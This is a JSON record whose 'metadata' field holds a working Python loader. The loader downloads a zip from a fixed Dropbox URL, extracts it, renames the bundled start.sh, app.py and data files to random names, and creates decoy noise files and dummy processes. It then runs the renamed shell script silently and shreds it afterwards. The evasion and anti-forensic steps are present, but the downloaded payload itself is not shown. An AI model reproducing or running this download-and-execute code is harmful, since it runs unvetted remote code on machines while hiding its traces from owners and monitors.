{"metadata":"import requests\nimport zipfile\nimport io\nimport subprocess\nimport os\nimport sys\nimport shutil\nimport time\nimport random\nimport string\nimport tempfile\nimport gc\n\ndef generate_random_name():\n    consonants = \"bcdfghjklmnpqrstvwxyz\"\n    vowels = \"aeiou\"\n    length = random.randint(6, 9)\n    name = \"\"\n    use_consonant = True\n    for _ in range(length):\n        if use_consonant:\n            name += random.choice(consonants)\n            use_consonant = False\n        else:\n            if random.choice([True, False]):\n                name += random.choice(consonants)\n            else:\n                name += random.choice(vowels)\n                use_consonant = True\n    return name\n\ndef main():\n    try:\n        temp_dir = tempfile.mkdtemp()\n        zip_url = \"https://www.dropbox.com/scl/fo/ui6vsehat89vd4makgxj5/ALN130myx6KQTVnwqDuKYAM?rlkey=87rugxhfp0y7xwohel9xwfj9y\u0026st=wlkx1xkd\u0026dl=1\"\n        response = requests.get(zip_url, stream=True)\n        if response.status_code != 200:\n            sys.exit(1)\n        zip_content = response.content\n        with zipfile.ZipFile(io.BytesIO(zip_content)) as z:\n            z.extractall(temp_dir)\n        os.chdir(temp_dir)\n        start_sh_path = os.path.join(temp_dir, \"start.sh\")\n        if not os.path.exists(start_sh_path):\n            sys.exit(1)\n        time.sleep(random.uniform(1, 3))\n        for _ in range(random.randint(5, 10)):\n            noise_file = f\"noise_{random.randint(1, 1000)}.tmp\"\n            with open(noise_file, \"w\") as f:\n                f.write(\"\".join(random.choices(string.ascii_letters, k=100)))\n            with open(noise_file, \"a\"):\n                pass\n            time.sleep(random.uniform(0.1, 0.5))\n        \n        # Renaming logic\n        orig_start = \"start.sh\"\n        orig_app = \"app.py\"\n        orig_dataset = \"dataset.txt\"\n        orig_benchmark = \"benchmark.txt\"\n        \n        if not all(os.path.exists(f) for f in [orig_start, orig_app, orig_dataset, orig_benchmark]):\n            sys.exit(1)\n        \n        new_start = f\"{generate_random_name()}.sh\"\n        new_app = f\"{generate_random_name()}.py\"\n        new_dataset = f\"{generate_random_name()}.txt\"\n        new_benchmark = f\"{generate_random_name()}.txt\"\n        \n        shutil.copy(orig_start, new_start)\n        shutil.copy(orig_app, new_app)\n        shutil.copy(orig_dataset, new_dataset)\n        shutil.copy(orig_benchmark, new_benchmark)\n        \n        with open(new_start, \"r\") as f:\n            content = f.read()\n        content = content.replace(f'\"{orig_app}\"', f'\"{new_app}\"')\n        content = content.replace(orig_dataset, new_dataset)\n        with open(new_start, \"w\") as f:\n            f.write(content)\n        \n        with open(new_app, \"r\") as f:\n            content = f.read()\n        content = content.replace(orig_benchmark, new_benchmark)\n        with open(new_app, \"w\") as f:\n            f.write(content)\n        \n        os.chmod(new_start, 0o755)\n        \n        for f in [orig_start, orig_app, orig_benchmark]:\n            os.remove(f)\n        \n        for _ in range(random.randint(2, 5)):\n            subprocess.Popen([\"sleep\", str(random.uniform(1, 5))], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)\n        process = subprocess.Popen(\n            [\"bash\", new_start],\n            stdout=subprocess.DEVNULL,\n            stderr=subprocess.DEVNULL,\n            text=True,\n            bufsize=1\n        )\n        return_code = process.wait()\n        \n    except Exception:\n        pass\n    \n    finally:\n        try:\n            if 'new_start' in locals() and os.path.exists(new_start):\n                for _ in range(3):\n                    with open(new_start, \"wb\") as f:\n                        f.write(os.urandom(os.path.getsize(new_start)))\n                    os.remove(new_start)\n            if 'temp_dir' in locals() and os.path.exists(temp_dir):\n                shutil.rmtree(temp_dir, ignore_errors=True)\n        except:\n            pass\n        for _ in range(random.randint(5, 10)):\n            try:\n                os.remove(f\"noise_{random.randint(1, 1000)}.tmp\")\n            except:\n                pass\n        locals().clear()\n        gc.collect()\n        sys.exit(0 if 'return_code' not in locals() else return_code)\n\nif __name__ == \"__main__\":\n    main()\n    globals().clear()"}
